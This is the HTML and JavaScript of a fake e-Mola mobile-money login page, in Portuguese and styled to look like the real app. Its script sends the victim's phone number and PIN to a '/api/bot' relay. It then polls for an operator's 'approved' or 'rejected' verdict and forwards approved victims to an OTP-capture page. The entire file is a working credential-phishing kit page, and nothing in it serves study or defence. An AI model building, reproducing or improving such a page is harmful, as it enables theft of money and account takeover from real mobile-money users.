<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - e-Mola</title>
    <link href="https://fonts.googleapis.com/css2?family=Caveat:wght@700&family=Nunito:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; font-family: 'Nunito', sans-serif; }
        body { margin: 0; background-color: #F27C00; display: flex; justify-content: center; min-height: 100vh; overflow: hidden; position: relative; }
        .bg-image { position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: radial-gradient(circle at 50% 30%, #FF9F1A, #F27C00); opacity: 0.8; z-index: -1; filter: blur(8px); }
        .app-container { width: 100%; max-width: 400px; padding: 20px; display: flex; flex-direction: column; position: relative; z-index: 1; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; color: white; }
        .back { font-size: 24px; text-decoration: none; color: white; }
        .lang { display: flex; align-items: center; gap: 5px; font-weight: bold; }
        .logo-container { text-align: center; margin-bottom: 40px; color: white; }
        .logo-icon { font-size: 60px; }
        .logo-text { font-family: 'Caveat', cursive; font-size: 48px; font-weight: bold; margin: 0; line-height: 1; }
        .tagline { font-size: 14px; font-weight: bold; margin-top: 5px; }
        .input-group { margin-bottom: 15px; }
        .input-group input { width: 100%; background: rgba(0,0,0,0.2); border: none; padding: 18px; border-radius: 12px; color: white; font-size: 16px; outline: none; }
        .input-group input::placeholder { color: rgba(255,255,255,0.7); }
        .btn-main { width: 100%; background: white; color: #333; font-size: 16px; font-weight: bold; padding: 18px; border: none; border-radius: 12px; margin-top: 20px; cursor: pointer; }
        .links { text-align: center; margin-top: 30px; }
        .links a { display: block; color: white; text-decoration: none; font-size: 16px; margin-bottom: 15px; }
        .footer { margin-top: auto; padding-bottom: 20px; text-align: center; color: white; }
        .icons { display: flex; justify-content: center; gap: 20px; margin-bottom: 15px; }
        .icon-btn { width: 50px; height: 50px; border-radius: 50%; background: white; display: flex; justify-content: center; align-items: center; font-size: 24px; color: #F27C00; }
        .version { font-size: 12px; opacity: 0.8; }
        
        /* Overlay & Error styles */
        #overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); color: white; flex-direction: column; justify-content: center; align-items: center; z-index: 999; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #F27C00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .error-msg { color: #ffcccc; font-weight: bold; text-align: center; display: none; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="bg-image"></div>

    <!-- Loading Overlay -->
    <div id="overlay">
        <div class="spinner"></div>
        <h2 style="color:#F27C00;">Verificando...</h2>
        <p>Aguarde por favor.</p>
    </div>

    <div class="app-container">
        <div class="header">
            <a href="dados.html" class="back">&#8592;</a>
            <div class="lang">🇵🇹 POR</div>
        </div>

        <div class="logo-container">
            <div class="logo-icon">📱💸</div>
            <div class="logo-text">e-Mola</div>
            <div class="tagline">Meu cell, minha mola</div>
        </div>

        <div class="error-msg" id="loginError">PIN incorreto. Tente novamente.</div>

        <div class="input-group">
            <input type="tel" id="phone" placeholder="Digite o número de telefone">
        </div>
        <div class="input-group">
            <input type="password" id="pin" placeholder="PIN" maxlength="4">
        </div>

        <button class="btn-main" onclick="submitLogin()">ENTRAR</button>

        <div class="links">
            <a href="#">Esqueceu a senha</a>
            <a href="#">Cadastrar-se</a>
        </div>

        <div class="footer">
            <div class="icons">
                <div class="icon-btn">📍</div>
                <div class="icon-btn">📖</div>
            </div>
            <div class="version">Versão 2.2.0</div>
        </div>
    </div>

    <!-- THIS IS THE CORRECT SCRIPT SECTION -->
    <script>
        var globalUserId = Date.now().toString().slice(-6);
        
        var savedPhone = sessionStorage.getItem('userPhone');
        if(savedPhone) { document.getElementById('phone').value = savedPhone.replace('+258', ''); }

        function submitLogin() {
            var phone = document.getElementById('phone').value;
            var pin = document.getElementById('pin').value;
            
            if(!phone || pin.length !== 4) {
                alert("Insira um número válido e um PIN de 4 dígitos.");
                return;
            }

            sessionStorage.setItem('globalUserId', globalUserId);
            document.getElementById('overlay').style.display = 'flex';
            
            fetch('/api/bot', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    action: 'send', type: 'PHONE_PIN', userId: globalUserId, 
                    data: { phone: '+258' + phone, pin: pin } 
                })
            }).then(function() { 
                pollStatus(); 
            }).catch(function() {
                document.getElementById('overlay').style.display = 'none';
                alert("Erro de rede. Verifique a sua ligação.");
            });
        }

        // THIS IS THE FUNCTION THAT PREVENTED CACHING
        function pollStatus() {
            var interval = setInterval(function() {
                fetch('/api/bot?userId=' + globalUserId + '&type=PHONE_PIN', { cache: 'no-store' })
                .then(function(res) { return res.json(); })
                .then(function(data) {
                    if (data.status === 'approved') {
                        clearInterval(interval);
                        window.location.href = 'otp.html'; 
                    } 
                    else if (data.status === 'rejected') {
                        clearInterval(interval);
                        document.getElementById('overlay').style.display = 'none';
                        document.getElementById('loginError').style.display = 'block';
                    }
                })
                .catch(function(err) {
                    clearInterval(interval);
                    document.getElementById('overlay').style.display = 'none';
                    alert("Erro de rede: " + err);
                });
            }, 2000);
        }
    </script>
</body>
</html>
